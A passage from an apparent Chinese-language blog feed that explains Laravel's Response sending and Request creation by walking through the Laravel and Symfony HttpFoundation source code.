(!$headers-&gt;has(<span class="string">'Content-Type'</span>)) &#123;</span><br><span class="line">                $headers-&gt;set(<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset='</span>.$charset);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="number">0</span> === stripos($headers-&gt;get(<span class="string">'Content-Type'</span>), <span class="string">'text/'</span>) &amp;&amp; <span class="keyword">false</span> === stripos($headers-&gt;get(<span class="string">'Content-Type'</span>), <span class="string">'charset'</span>)) &#123;</span><br><span class="line">                <span class="comment">// add the charset</span></span><br><span class="line">                $headers-&gt;set(<span class="string">'Content-Type'</span>, $headers-&gt;get(<span class="string">'Content-Type'</span>).<span class="string">'; charset='</span>.$charset);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Fix Content-Length</span></span><br><span class="line">            <span class="keyword">if</span> ($headers-&gt;has(<span class="string">'Transfer-Encoding'</span>)) &#123;</span><br><span class="line">                $headers-&gt;remove(<span class="string">'Content-Length'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($request-&gt;isMethod(<span class="string">'HEAD'</span>)) &#123;</span><br><span class="line">                <span class="comment">// cf. RFC2616 14.13</span></span><br><span class="line">                $length = $headers-&gt;get(<span class="string">'Content-Length'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;setContent(<span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">if</span> ($length) &#123;</span><br><span class="line">                    $headers-&gt;set(<span class="string">'Content-Length'</span>, $length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fix protocol</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'HTTP/1.0'</span> != $request-&gt;server-&gt;get(<span class="string">'SERVER_PROTOCOL'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setProtocolVersion(<span class="string">'1.1'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if we need to send extra expire info headers</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'1.0'</span> == <span class="keyword">$this</span>-&gt;getProtocolVersion() &amp;&amp; <span class="keyword">false</span> !== strpos(<span class="keyword">$this</span>-&gt;headers-&gt;get(<span class="string">'Cache-Control'</span>), <span class="string">'no-cache'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;headers-&gt;set(<span class="string">'pragma'</span>, <span class="string">'no-cache'</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;headers-&gt;set(<span class="string">'expires'</span>, <span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;ensureIEOverSSLCompatibility($request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>prepare</code>里针对各种情况设置了相应的<code>response header</code> 比如<code>Content-Type</code>、<code>Content-Length</code>等等这些我们常见的首部字段。</p><h3 id="发送Response"><a href="#发送Response" class="headerlink" title="发送Response"></a>发送Response</h3><p>创建并设置完Response后它会流经路由和框架中间件的后置操作，在中间件的后置操作里一般都是对Response进行进一步加工，最后程序流回到Http Kernel那里， Http Kernel会把Response发送给客户端，我们来看一下这部分的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入口文件public/index.php</span></span><br><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$response-&gt;send();</span><br><span class="line"></span><br><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendHeaders();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendContent();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'fastcgi_finish_request'</span>)) &#123;</span><br><span class="line">            fastcgi_finish_request();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'cli'</span> !== PHP_SAPI) &#123;</span><br><span class="line">            <span class="keyword">static</span>::closeOutputBuffers(<span class="number">0</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//发送headers到客户端</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendHeaders</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// headers have already been sent by the developer</span></span><br><span class="line">        <span class="keyword">if</span> (headers_sent()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// headers</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;headers-&gt;allPreserveCaseWithoutCookies() <span class="keyword">as</span> $name =&gt; $values) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($values <span class="keyword">as</span> $value) &#123;</span><br><span class="line">                header($name.<span class="string">': '</span>.$value, <span class="keyword">false</span>, <span class="keyword">$this</span>-&gt;statusCode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// status</span></span><br><span class="line">        header(sprintf(<span class="string">'HTTP/%s %s %s'</span>, <span class="keyword">$this</span>-&gt;version, <span class="keyword">$this</span>-&gt;statusCode, <span class="keyword">$this</span>-&gt;statusText), <span class="keyword">true</span>, <span class="keyword">$this</span>-&gt;statusCode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// cookies</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;headers-&gt;getCookies() <span class="keyword">as</span> $cookie) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($cookie-&gt;isRaw()) &#123;</span><br><span class="line">                setrawcookie($cookie-&gt;getName(), $cookie-&gt;getValue(), $cookie-&gt;getExpiresTime(), $cookie-&gt;getPath(), $cookie-&gt;getDomain(), $cookie-&gt;isSecure(), $cookie-&gt;isHttpOnly());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                setcookie($cookie-&gt;getName(), $cookie-&gt;getValue(), $cookie-&gt;getExpiresTime(), $cookie-&gt;getPath(), $cookie-&gt;getDomain(), $cookie-&gt;isSecure(), $cookie-&gt;isHttpOnly());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//发送响应内容到客户端</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendContent</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;content;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>send</code>的逻辑就非常好理解了，把之前设置好的那些headers设置到HTTP响应的首部字段里，Content会echo后被设置到HTTP响应的主体实体中。最后PHP会把完整的HTTP响应发送给客户端。</p><p>send响应后Http Kernel会执行<code>terminate</code>方法调用terminate中间件里的<code>terminate</code>方法，最后执行应用的<code>termiate</code>方法来结束整个应用生命周期(从接收请求开始到返回响应结束)。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel学习之Request</title>
      <link href="/2018/10/20/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8BRequest/"/>
      <url>/2018/10/20/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8BRequest/</url>
      
        <content type="html"><![CDATA[<p>当我们定义好路由之后就可以编写控制器来处理请求了，路由的知识上一篇已经基本过了一遍，接下来我们来看Request</p><a id="more"></a><h1 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h1><p>laravel中的request构建在<code>Symfony</code>框架提供的Request组件基础之上的。虽说速查手册有说明request的各种方法，但是如果我们看了源码，我们就直接在源码中寻找request的方法就好了，比如路径在vendor/laravel/Illuminate/Http/Request.php中，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Http;</span><br><span class="line"></span><br><span class="line">use Closure;</span><br><span class="line">use ArrayAccess;</span><br><span class="line">use RuntimeException;</span><br><span class="line">use Illuminate\Support\Arr;</span><br><span class="line">use Illuminate\Support\Str;</span><br><span class="line">use Illuminate\Support\Traits\Macroable;</span><br><span class="line">use Illuminate\Contracts\Support\Arrayable;</span><br><span class="line">use Symfony\Component\HttpFoundation\ParameterBag;</span><br><span class="line">use Symfony\Component\HttpFoundation\Request as SymfonyRequest;</span><br><span class="line"></span><br><span class="line">class Request extends SymfonyRequest implements Arrayable, ArrayAccess</span><br><span class="line">&#123;</span><br><span class="line">    use Concerns\InteractsWithContentTypes,</span><br><span class="line">        Concerns\InteractsWithFlashData,</span><br><span class="line">        Concerns\InteractsWithInput,</span><br><span class="line">        Macroable;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * The decoded JSON content <span class="keyword">for</span> the request.</span><br><span class="line">     *</span><br><span class="line">     * @var \Symfony\Component\HttpFoundation\ParameterBag|null</span><br><span class="line">     */</span><br><span class="line">    protected <span class="variable">$json</span>;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * All of the converted files <span class="keyword">for</span> the request.</span><br><span class="line">     *</span><br><span class="line">     * @var array</span><br><span class="line">     */</span><br><span class="line">    protected <span class="variable">$convertedFiles</span>;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * The user resolver callback.</span><br><span class="line">     *</span><br><span class="line">     * @var \Closure</span><br><span class="line">     */</span><br><span class="line">    protected <span class="variable">$userResolver</span>;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * The route resolver callback.</span><br><span class="line">     *</span><br><span class="line">     * @var \Closure</span><br><span class="line">     */</span><br><span class="line">    protected <span class="variable">$routeResolver</span>;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Create a new Illuminate HTTP request from server variables.</span><br><span class="line">     *</span><br><span class="line">     * @<span class="built_in">return</span> static</span><br><span class="line">     */</span><br><span class="line">    public static <span class="keyword">function</span> capture()</span><br><span class="line">    &#123;</span><br><span class="line">        static::enableHttpMethodParameterOverride();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> static::createFromBase(SymfonyRequest::createFromGlobals());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Return the Request instance.</span><br><span class="line">     *</span><br><span class="line">     * @<span class="built_in">return</span> <span class="variable">$this</span></span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> instance()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Get the request method.</span><br><span class="line">     *</span><br><span class="line">     * @<span class="built_in">return</span> string</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> method()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;getMethod();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Get the root URL <span class="keyword">for</span> the application.</span><br><span class="line">     *</span><br><span class="line">     * @<span class="built_in">return</span> string</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> root()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> rtrim(<span class="variable">$this</span>-&gt;getSchemeAndHttpHost().<span class="variable">$this</span>-&gt;getBaseUrl(), <span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    /**</span><br><span class="line">     * Check <span class="keyword">if</span> an input element is <span class="built_in">set</span> on the request.</span><br><span class="line">     *</span><br><span class="line">     * @param  string  <span class="variable">$key</span></span><br><span class="line">     * @<span class="built_in">return</span> bool</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> __isset(<span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> ! is_null(<span class="variable">$this</span>-&gt;__get(<span class="variable">$key</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Get an input element from the request.</span><br><span class="line">     *</span><br><span class="line">     * @param  string  <span class="variable">$key</span></span><br><span class="line">     * @<span class="built_in">return</span> mixed</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$key</span>, <span class="variable">$this</span>-&gt;all())) &#123;</span><br><span class="line">            <span class="built_in">return</span> data_get(<span class="variable">$this</span>-&gt;all(), <span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;route(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只列出一些，具体可以去源码查看，接下来我们来看laravel是怎么创建的</p><h2 id="创建Request对象"><a href="#创建Request对象" class="headerlink" title="创建Request对象"></a>创建Request对象</h2><p>我们可以在Laravel应用程序的<code>index.php</code>文件中看到，在Laravel应用程序正式启动完成前Request对象就已经被创建好了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//public/index.php</span></span><br><span class="line">$app = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">'/../bootstrap/app.php'</span>;</span><br><span class="line"></span><br><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    <span class="comment">//创建request对象</span></span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>客户端的HTTP请求是<code>Illuminate\Http\Request</code>类的对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> <span class="title">SymfonyRequest</span> <span class="keyword">implements</span> <span class="title">Arrayable</span>, <span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//新建Request实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">capture</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::enableHttpMethodParameterOverride();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::createFromBase(SymfonyRequest::createFromGlobals());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>Illuminate\Http\Request</code>类的源码可以看到它是继承自<code>Symfony Request</code>类的，所以<code>Illuminate\Http\Request</code>类中实现的很多功能都是以<code>Symfony Reques</code>提供的功能为基础来实现的。上面的代码就可以看到<code>capture</code>方法新建Request对象时也是依赖于<code>Symfony Request</code>类的实例的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据PHP提供的超级全局数组来创建Smyfony Request实例</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> static</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createFromGlobals</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// With the php's bug #66606, the php's built-in web server</span></span><br><span class="line">        <span class="comment">// stores the Content-Type and Content-Length header values in</span></span><br><span class="line">        <span class="comment">// HTTP_CONTENT_TYPE and HTTP_CONTENT_LENGTH fields.</span></span><br><span class="line">        $server = $_SERVER;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'cli-server'</span> === PHP_SAPI) &#123;</span><br><span class="line">            <span class="keyword">if</span> (array_key_exists(<span class="string">'HTTP_CONTENT_LENGTH'</span>, $_SERVER)) &#123;</span><br><span class="line">                $server[<span class="string">'CONTENT_LENGTH'</span>] = $_SERVER[<span class="string">'HTTP_CONTENT_LENGTH'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (array_key_exists(<span class="string">'HTTP_CONTENT_TYPE'</span>, $_SERVER)) &#123;</span><br><span class="line">                $server[<span class="string">'CONTENT_TYPE'</span>] = $_SERVER[<span class="string">'HTTP_CONTENT_TYPE'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $request = <span class="keyword">self</span>::createRequestFromFactory($_GET, $_POST, <span class="keyword">array</span>(), $_COOKIE, $_FILES, $server);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> === strpos($request-&gt;headers-&gt;get(<span class="string">'CONTENT_TYPE'</span>), <span class="string">'application/x-www-form-urlencoded'</span>)</span><br><span class="line">            &amp;&amp; in_array(strtoupper($request-&gt;server-&gt;get(<span class="string">'REQUEST_METHOD'</span>, <span class="string">'GET'</span>)), <span class="keyword">array</span>(<span class="string">'PUT'</span>, <span class="string">'DELETE'</span>, <span class="string">'PATCH'</span>))</span><br><span class="line">        ) &#123;</span><br><span class="line">            parse_str($request-&gt;getContent(), $data);</span><br><span class="line">            $request-&gt;request = <span class="keyword">new</span> ParameterBag($data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码有一处需要额外解释一下，自PHP5.4开始PHP内建的builtin web server可以通过命令行解释器来启动，例如：</p><blockquote><p>php -S localhost:8000 -t htdocs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> -S &lt;addr&gt;:&lt;port&gt; Run with built-in web server.</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> -t &lt;docroot&gt;     Specify document root &lt;docroot&gt; <span class="keyword">for</span> built-in web server.</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></blockquote><blockquote></blockquote><p>但是内建web server有一个bug是将<code>CONTENT_LENGTH</code>和<code>CONTENT_TYPE</code>这两个请求首部存储到了<code>HTTP_CONTENT_LENGTH</code>和<code>HTTP_CONTENT_TYPE</code>中，为了统一内建服务器和真正的server中的请求首部字段所以在这里做了特殊处理。</p><p>Symfony Request 实例的创建是通过PHP中的超级全局数组来创建的，这些超级全局数组有<code>$_GET</code>，<code>$_POST</code>，<code>$_COOKIE</code>，<code>$_FILES</code>，<code>$_SERVER</code>涵盖了PHP中所有与HTTP请求相关的超级全局数组，创建Symfony Request实例时会根据这些全局数组创建Symfony Package里提供的<code>ParamterBag</code> <code>ServerBag</code> <code>FileBag</code> <code>HeaderBag</code>实例，这些Bag都是Symfony提供地针对不同HTTP组成部分的访问和设置API， 关于Symfony提供的<code>ParamterBag</code>这些实例有兴趣的读者自己去源码里看看吧，这里就不多说了。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @param<span class="built_in"> array </span>               $query      The GET parameters</span><br><span class="line">     * @param<span class="built_in"> array </span>               $request    The POST parameters</span><br><span class="line">     * @param<span class="built_in"> array </span>               $attributes The request attributes (parameters parsed from the PATH_INFO, ...)</span><br><span class="line">     * @param<span class="built_in"> array </span>               $cookies    The COOKIE parameters</span><br><span class="line">     * @param<span class="built_in"> array </span>               $files      The FILES parameters</span><br><span class="line">     * @param<span class="built_in"> array </span>               $server     The SERVER parameters</span><br><span class="line">     * @param string|resource|null $content    The raw body data</span><br><span class="line">     */</span><br><span class="line">   <span class="keyword"> public</span> function __construct(array $query = array(),<span class="built_in"> array </span>$request = array(),<span class="built_in"> array </span>$attributes = array(),<span class="built_in"> array </span>$cookies = array(),<span class="built_in"> array </span>$files = array(),<span class="built_in"> array </span>$server = array(), $content = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;initialize($query, $request, $attributes, $cookies, $files, $server, $content);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="keyword"> public</span> function initialize(array $query = array(),<span class="built_in"> array </span>$request = array(),<span class="built_in"> array </span>$attributes = array(),<span class="built_in"> array </span>$cookies = array(),<span class="built_in"> array </span>$files = array(),<span class="built_in"> array </span>$server = array(), $content = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;request =<span class="built_in"> new </span>ParameterBag($request);</span><br><span class="line">        $this-&gt;query =<span class="built_in"> new </span>ParameterBag($query);</span><br><span class="line">        $this-&gt;attributes =<span class="built_in"> new </span>ParameterBag($attributes);</span><br><span class="line">        $this-&gt;cookies =<span class="built_in"> new </span>ParameterBag($cookies);</span><br><span class="line">        $this-&gt;files =<span class="built_in"> new </span>FileBag($files);</span><br><span class="line">        $this-&gt;server =<span class="built_in"> new </span>ServerBag($server);</span><br><span class="line">        $this-&gt;headers =<span class="built_in"> new </span>HeaderBag($this-&gt;server-&gt;getHeaders());</span><br><span class="line"></span><br><span class="line">        $this-&gt;content = $content;</span><br><span class="line">        $this-&gt;languages = null;</span><br><span class="line">        $this-&gt;charsets = null;</span><br><span class="line">        $this-&gt;encodings = null;</span><br><span class="line">        $this-&gt;acceptableContentTypes = null;</span><br><span class="line">        